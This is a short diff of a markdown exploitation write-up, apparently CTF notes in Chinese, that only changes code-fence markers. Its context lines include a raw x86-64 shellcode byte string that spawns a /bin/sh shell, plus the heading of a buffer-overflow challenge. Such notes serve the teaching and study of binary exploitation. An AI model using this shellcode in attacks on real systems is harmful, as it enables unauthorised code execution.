@@ -39,13 +39,13 @@ codes = """
 """
 payloads = asm(codes)
 ```
-```python!
+```python
 payloads = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
 ```
 
 ## Challenge #2 buffer overflow with no canary
 我把注解放在原始code裡面
-```c!
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
